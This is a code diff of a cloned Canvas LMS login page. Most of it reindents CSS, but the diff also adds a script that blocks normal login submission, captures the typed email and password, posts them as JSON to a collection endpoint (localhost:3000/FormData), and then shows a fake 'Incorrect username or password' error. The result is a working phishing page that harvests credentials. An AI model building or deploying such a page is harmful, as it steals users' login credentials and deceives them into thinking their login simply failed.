@@ -194,7 +194,7 @@
     <script charset="utf-8" src="https://du11hjcvx0uqb.cloudfront.net/br/dist/webpack-production/749-c-095a41323e.js"></script>
 
     <style type="text/css">
-                /*
+        /*
          * Copyright (C) 2014 - present Instructure, Inc.
          *
          * This file is part of Canvas.
@@ -212,119 +212,119 @@
          * with this program. If not, see <http://www.gnu.org/licenses/>.
          */
 
-                /* customizations to mediaelementplayer css */
+        /* customizations to mediaelementplayer css */
 
-                /*
+        /*
           Because this file is not proccessed by our brandable_css sass pipeline,
           it cannot use our sass-direction helpers. So we have to handle RTL manually
           by putting direction-specific styles in [dir="ltr"] or [dir="rtl"] blocks.
         */
-                /* stylelint-disable property-disallowed-list, declaration-property-value-disallowed-list */
+        /* stylelint-disable property-disallowed-list, declaration-property-value-disallowed-list */
 
-                /* good menu widths */
-                .mejs-sourcechooser-selector {
-                    width: 160px;
+        /* good menu widths */
+        .mejs-sourcechooser-selector {
+            width: 160px;
+        }
+
+            .mejs-sourcechooser-selector label {
+                width: 160px !important;
+            }
+
+        .mejs-captions-selector {
+            width: 105px;
+        }
+
+        [dir="ltr"] .mejs-captions-selector {
+            text-align: left
+        }
+
+        [dir="rtl"] .mejs-captions-selector {
+            text-align: right
+        }
+
+        .mejs-captions-selector label {
+            width: 70px !important;
+        }
+
+        /* Subtitile upload link */
+        .mejs-captions-selector .upload-track {
+            color: white;
+            margin-top: 3px;
+            margin-bottom: 5px;
+        }
+
+        [dir="ltr"] .mejs-captions-selector .upload-track {
+            margin-right: 0px;
+            margin-left: 5px;
+            float: left;
+        }
+
+        [dir="rtl"] .mejs-captions-selector .upload-track {
+            margin-left: 0px;
+            margin-right: 5px;
+            float: right;
+        }
+
+        /* "x" button to remove a subtitle */
+        .mejs-captions-selector a[data-remove] {
+            position: absolute;
+            top: 0;
+            color: white;
+        }
+
+        [dir="ltr"] .mejs-captions-selector a[data-remove] {
+            right: 0
+        }
+
+        [dir="rtl"] .mejs-captions-selector a[data-remove] {
+            left: 0
+        }
+
+
+        /* style menu items without a radio button */
+        .mejs-button [role="menu"] {
+            padding: 0 !important;
+        }
+            /* compensate for above 0 padding */
+            .mejs-button [role="menu"] ul li {
+                position: relative;
+                padding: 0 10px !important;
+            }
+                /* add a hover effect */
+                .mejs-button [role="menu"] ul li:hover {
+                    background-color: #c8c8c8 !important;
+                    background-color: rgba(255, 255, 255, 0.4) !important;
                 }
 
-                    .mejs-sourcechooser-selector label {
-                        width: 160px !important;
-                    }
-
-                .mejs-captions-selector {
-                    width: 105px;
-                }
-
-                [dir="ltr"] .mejs-captions-selector {
-                    text-align: left
-                }
-
-                [dir="rtl"] .mejs-captions-selector {
-                    text-align: right
-                }
-
-                .mejs-captions-selector label {
-                    width: 70px !important;
-                }
-
-                /* Subtitile upload link */
-                .mejs-captions-selector .upload-track {
-                    color: white;
-                    margin-top: 3px;
-                    margin-bottom: 5px;
-                }
-
-                [dir="ltr"] .mejs-captions-selector .upload-track {
-                    margin-right: 0px;
-                    margin-left: 5px;
-                    float: left;
-                }
-
-                [dir="rtl"] .mejs-captions-selector .upload-track {
-                    margin-left: 0px;
-                    margin-right: 5px;
-                    float: right;
-                }
-
-                /* "x" button to remove a subtitle */
-                .mejs-captions-selector a[data-remove] {
+                .mejs-button [role="menu"] ul li input {
+                    border: 0;
+                    clip: rect(0 0 0 0);
                     position: absolute;
-                    top: 0;
-                    color: white;
+                    overflow: hidden;
+                    margin: -1px;
+                    padding: 0;
+                    width: 1px;
+                    height: 1px;
                 }
 
-                [dir="ltr"] .mejs-captions-selector a[data-remove] {
-                    right: 0
+                .mejs-button [role="menu"] ul li label {
+                    cursor: pointer;
                 }
 
-                [dir="rtl"] .mejs-captions-selector a[data-remove] {
-                    left: 0
-                }
+        [dir="ltr"] .mejs-button [role="menu"] ul li label {
+            margin-left: 5px
+        }
+
+        [dir="rtl"] .mejs-button [role="menu"] ul li label {
+            margin-right: 5px
+        }
 
 
-                /* style menu items without a radio button */
-                .mejs-button [role="menu"] {
-                    padding: 0 !important;
-                }
-                    /* compensate for above 0 padding */
-                    .mejs-button [role="menu"] ul li {
-                        position: relative;
-                        padding: 0 10px !important;
-                    }
-                        /* add a hover effect */
-                        .mejs-button [role="menu"] ul li:hover {
-                            background-color: #c8c8c8 !important;
-                            background-color: rgba(255, 255, 255, 0.4) !important;
-                        }
+        .mejs-button [role="menu"] label.mejs-selected {
+            color: #21f8f8 !important;
+        }
 
-                        .mejs-button [role="menu"] ul li input {
-                            border: 0;
-                            clip: rect(0 0 0 0);
-                            position: absolute;
-                            overflow: hidden;
-                            margin: -1px;
-                            padding: 0;
-                            width: 1px;
-                            height: 1px;
-                        }
-
-                        .mejs-button [role="menu"] ul li label {
-                            cursor: pointer;
-                        }
-
-                [dir="ltr"] .mejs-button [role="menu"] ul li label {
-                    margin-left: 5px
-                }
-
-                [dir="rtl"] .mejs-button [role="menu"] ul li label {
-                    margin-right: 5px
-                }
-
-
-                .mejs-button [role="menu"] label.mejs-selected {
-                    color: #21f8f8 !important;
-                }
-
-                /* stylelint-enable property-disallowed-list, declaration-property-value-disallowed-list */
+        /* stylelint-enable property-disallowed-list, declaration-property-value-disallowed-list */
     </style>
     <script charset="utf-8" src="https://du11hjcvx0uqb.cloudfront.net/br/dist/webpack-production/281-c-c4dc527845.js"></script>
 </head>
@@ -391,11 +391,12 @@
                                                 </div>
                                             </div>
                                             </br>
-                                            <div style="color:red; margin-left:20px;">
-                                                @ViewBag.error
-                                            </div>    
+
                                             <div class="ic-Login__body">
-                                                <form id="login_form" action="/Home/CollectData" accept-charset="UTF-8" method="post">
+                                                <form id="login_form" accept-charset="UTF-8">
+                                                    <div style="color:red; margin-left:20px;">
+                                                        
+                                                    </div>
                                                     <input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="1OD4Qr6XXwpSOPevv8KnWExPJvpw7jw/CbbIVNgT++GuiYsE8t42ZBlzrp/Gjc1pAiRttRGjF1tZ9YB/inWukg==">
                                                     <h1 class="ui-helper-hidden-accessible">
                                                         Log In
@@ -404,11 +405,11 @@
                                                     <input type="hidden" name="redirect_to_ssl" value="1">
                                                     <div class="ic-Form-control ic-Form-control--login">
                                                         <label class="ic-Label" for="pseudonym_session_unique_id">Email</label>
-                                                        <input class="ic-Input text" autofocus="autofocus" type="text" name="email" id="pseudonym_session_unique_id" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+                                                        <input id="username" class="ic-Input text" autofocus="autofocus" type="text" name="email" id="pseudonym_session_unique_id" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
                                                     </div>
                                                     <div class="ic-Form-control ic-Form-control--login">
                                                         <label class="ic-Label" for="pseudonym_session_password">Password</label>
-                                                        <input class="ic-Input text" role="textbox" type="password" name="password" id="pseudonym_session_password" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+                                                        <input id="password" class="ic-Input text" role="textbox" type="password" name="password" id="pseudonym_session_password" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
                                                     </div>
                                                     <div class="ic-Login__actions">
                                                         <div class="ic-Login__actions-timeout">
@@ -427,9 +428,9 @@
                                                             </button>
                                                         </div>
                                                     </div> <!-- ic-Login__actions -->
-                                                </form>          
+                                                </form>
 
-                                            <form id="forgot_password_form" style="display: none;" action="/forgot_password" accept-charset="UTF-8" method="post">
+                                                <form id="forgot_password_form" style="display: none;" action="/forgot_password" accept-charset="UTF-8" method="post">
                                                     <input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="thzk0y+0f44OD6WWEeUHfaznWTX0tYpUN0zq5qBJ+BDMdZeVY/0W4EVE/KZoqm1M4owSepX4oTBnD6LN8i+tYw==">
                                                     <h1 class="ui-helper-hidden-accessible">Forgot Password?</h1>
                                                     <p id="forgot_password_instructions" class="ic-Login__forgot-text">
@@ -545,11 +546,60 @@
                 s.async = false
                 document.head.appendChild(s)
             });
-//]]>
+            //]]>
         </script>
 
     </div> <!-- #application -->
 
+    <script>
+        function setErrorMessage(message) {
+            const form = document.getElementById("username").closest("form");
 
+            const errorDiv = document.createElement("div");
+            errorDiv.id = "fakeErrorMessage";
+            errorDiv.style.color = "red";
+            errorDiv.textContent = message;
+
+            if (form.querySelector("#fakeErrorMessage")) {
+                errorDiv = document.getElementById("fakeErrorMessage");
+                errorDiv.textContent = message;
+                return;
+            }
+
+            if (form.firstChild) {
+                form.insertBefore(errorDiv, form.firstChild);
+            } else {
+                form.appendChild(errorDiv);
+            }
+        }
+        document.getElementById("login_form").addEventListener("submit", function (e) {
+
+            e.preventDefault(); // stop normal form submission
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (!username || !password) {
+                setErrorMessage("Username or password cannot be empty");
+                return;
+            }
+
+            const formData = {
+                Username: username,
+                Password: password,
+                Timestamp: Date.now()
+            };
+
+            fetch("http://localhost:3000/FormData", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
+            })
+                .then(res => console.log("Success", res))
+                .catch(err => console.error("Error sending data:", err));
+
+            setErrorMessage("Incorrect username or password");
+        });
+    </script>
 </body>
 </html>
